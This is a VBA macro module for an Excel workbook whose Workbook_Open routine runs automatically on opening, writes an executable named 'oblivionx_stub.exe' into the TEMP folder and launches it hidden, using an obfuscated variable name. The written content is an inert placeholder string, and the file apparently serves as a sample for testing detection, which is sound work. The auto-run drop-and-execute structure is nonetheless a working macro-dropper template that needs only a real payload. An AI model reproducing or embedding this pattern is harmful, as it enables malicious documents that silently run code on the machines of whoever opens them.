Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim jybosg1pnivrj As Integer, exe As String
    exe = Environ("TEMP") & "\oblivionx_stub.exe"
    jybosg1pnivrj = FreeFile
    Open exe For Binary As #jybosg1pnivrj
    Put #jybosg1pnivrj, , "MZ-this-is-an-inert-marker-stub"
    Close #jybosg1pnivrj
    Shell exe, 0
End Sub
